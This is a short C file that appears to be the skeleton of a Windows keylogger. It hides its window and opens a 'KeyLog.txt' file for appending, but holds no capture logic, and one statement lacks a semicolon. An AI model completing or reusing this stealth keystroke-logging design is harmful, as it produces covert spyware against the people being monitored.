#include "winkey.h"

int main(void)
{
    hideWindow();

    FILE    *LogFile;
    errno_t err;

    err = fopen_s(&LogFile, "C:\\Users\\Vicente\\Tmp\\KeyLog.txt", "a+")
    if (err != 0)
        return 1;



    fclose(LogFile);
    
    return 0;
}